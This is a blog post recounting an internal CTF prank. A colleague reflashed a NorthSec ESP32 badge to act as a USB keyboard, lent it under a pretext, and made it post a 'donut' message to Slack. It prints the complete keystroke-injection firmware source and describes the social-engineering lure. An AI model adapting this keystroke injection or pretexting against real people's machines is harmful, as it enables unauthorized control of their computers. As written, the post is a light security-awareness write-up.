---
layout: post

title: "🍩Hacking for fun and donuts🍩"

tags: [Hacking, Security, Cybersecurity, CTF, Capture The Flag]

author:
  name: Cedric Brisson
  bio: Lead SOC Analyst
  image: cbrisson.jpg

---

For this year’s CTF, one of the challenge was to donut me (@Cedric Brisson) and/or phish my credentials. For a hefty 300pts + some donuts, our one and only @Andre Theriault managed to win this challenge.

But how do you trick a security freak into getting donuted? Simple put, social engineering and a bit of tech wizardry.

The technical part
To better understand what actually happened, it’s important to do a quick dive into how André achieved this from a technical perspective.

# What's a CTF?

// TODO: Fill in What's a CTF



# NorthSec in a nutshell 
 
To put it simply, NorthSec is one of the largest Canadian cybersecurity event hosted annually in Montreal. It’s known for a few things such as it’s technical talks, it’s workshops but most importantly, it’s CTF. It’s an event where a bunch of nerds group up and share information about cybersecurity. The talks ranges from stuff like “Under the Radar: How we found 0-days in the Build Pipeline of OSS Packages” to “Insert coin: Hacking arcades for fun”. Beyond its technical focus, NorthSec offers great networking opportunities in a vibrant setting, making it a must-attend for anyone serious about staying at the forefront of cybersecurity innovation and skill development.

But why are we talking about this? Well because this year, I happened to not attend the CTF but André did. Each year, NorthSec has 2 badges. One of the conferences and one for the CTF. This year was different however, there was only one badge but those attending the competition would get it flashed with a special software.

![NorthSec 2024 conference & CTF badge](/images/2024-08-01-hacking-for-fun-and-donuts/badge-with-cover.png)

This year’s NorthSec badge
This year’s badge offered a few features. One thing that is recurrent every year is that it’s essentially made to be a social tool. You plug your badge into someone else’s badge to gain points that enable new animations. The “syncing” of the badges typically takes a few minutes which forces you to talk to people a bit a meet new friends. We managed to get a pretty long chain too! Linking with more badges at once would essentially activate a “point multiplier”.

![NorthSec 2024 conference & CTF badge chain](/images/2024-08-01-hacking-for-fun-and-donuts/badge-chain.jpg) 

# The ESP32 
 
But how does the badge work? Well, it uses a chip called an ESP32. In essence, it’s essentially a small chip that’s easily programmable which offers a few features such as Bluetooth and WIFI capabilities. One of the key things it offers is being able to be reprogrammed. This will be important later on :wink:.

![Northsec 2024 conference & CTF parts](/images/2024-08-01-hacking-for-fun-and-donuts/uncovered-badge.png)

It was also connected to the following which were key to the exploit:

- A RESET button that essentially acts as a way to reboot the chip
- A BOOT button that, if pressed while plugging in the USB-C connector, enabled “flashing mode”
- A USB-C port to flash the chip

# The social engineering
In the context of information security, social engineering is the psychological manipulation of people into performing actions or divulging confidential information. A type of confidence trick for the purpose of information gathering, fraud, or system access, it differs from a traditional "con" in the sense that it is often one of the many steps in a more complex fraud scheme. It has also been defined as "any act that influences a person to take an action that may or may not be in their best interests."

Now that we understand the technical background of the exploit, let’s dive into how he managed to convince me to get donuted.

André knows I’m an avid CTF player. Knowing I couldn’t participate at this year’s edition, he offered me to lend me his badge so I could dump the firmware and start reverse engineering it to see if I couldn’t get a flag or two.

![Conversation between me and the person who pwned me](/images/2024-08-01-hacking-for-fun-and-donuts/conversation-1.png)

What I thought was a kind offer ended up being my downfall. André had found a way to get me to plug something in my computer without doubting it’s legitimacy. He leveraged a passion of mine against me. This is exactly what social engineering is all about; leveraging human flaws to attain a goal the person would normally not go along with.

The malicious code
What André had secretly done was to upload “malicious” firmware that would loop a set of commands while pretending to be a keyboard. Here’s the code in question with some comments on what each line does:


```c
#include "USB.h"
#include "USBHIDKeyboard.h"
USBHIDKeyboard Keyboard;
const char* CTF_CHANNEL = "slack://channel?team=T025J1W63&id=C01D2N3Q5EF";
const char* DONUT = "/donut";
void setup() {
  Keyboard.begin(); // Sets everything to present itself as a keyboard
  USB.begin(); // Starts USB communication
}
void loop() {
    delay(5000); // Waits 5 seconds
    // Open Slack
    // ===================================================================
    Keyboard.press(KEY_LEFT_GUI); // Holds the "windows key"
    Keyboard.press('r'); // Presses the "r" key to start the "run" utility
    delay(100); // waits 100ms
    Keyboard.releaseAll(); // releases previously pressed keys
    delay(100); 
    // Writes the CTF channel deeplink to the run utility and presses enter
    Keyboard.println(CTF_CHANNEL); 
    delay(500);
    // ===================================================================
    // This loop repeats the following actions
    // ===================================================================
    for(int i = 0; i < 3; i++) {
      // sends message to channel
      Keyboard.println("I LOVE DONUTS, AND FREE 300PTS DURING CTFs");
      // sends donut command
      Keyboard.println(DONUT);
      delay(500);
    }
    // ===================================================================
    delay(1000);
}
```
All in all, it’s a fairly simple program.

# What are deeplinks?
To fully understand the “exploit”, we have to dive into deeplinks. A deeplink is defined as such:

A custom URL schemes to direct users to specific pages within an app, enhancing user engagement, retention, and improving conversion rates

We’re all familiar with http/s URLs such as “https://coveo.com”. The “https://” part is referred to as a “scheme”. There’s a ton of schemes out there such as “http://”, “https://”, “ftp://”, “ssh://”, and so on. Nearly anything goes as long as your system supports it. 

It just so happened that Slack has it’s own deeplink which is “slack://…”. With this, one can simply open Slack with the following link “slack://channel?team=T025J1W63&id=C01D2N3Q5EF”. Let’s break it down:

- slack:// → The Slack deeplink scheme
- channel → Telling slack what you want to open is a channel
- ?team=T025J1W63 → Our Slack org ID
- &id=C01D2N3Q5EF → The channel ID (in this case, it’s #coveo-ctfs)

Piecing all of this together, you can a simple URL that opens Slack directly to the CTF channel. It’s a very elegant way of avoiding having to automate tabbing through all possible channels and checking if you’ve tabbed on the right one.

# Where it nearly went wrong
Upon getting my hands on the badge, my first instinct was to directly plug the badge to my computer but in flash mode. When in flash mode, the firmware on the device does not run. This means that his exploit wouldn’t have worked. By pure luck, for reasons unknown to me, the firmware dump was taking an insane long time to complete. 

This gave André a chance to sneak up next to me and “just start looking at my badge”. To my surprise, the dump suddenly stopped and I thought it was because the USB connector had made a bad contact or something. Turns out André had sneakily pushed the reset button putting the badge into it’s malicious state which executed the code.

![Message "I" posted that confirmed the exploit](/images/2024-08-01-hacking-for-fun-and-donuts/donut-message.png)

And just like that, I owed a few boxes of Donuts and André won 300pts🍩

Let’s see who can achieve a similar feat next year :wink: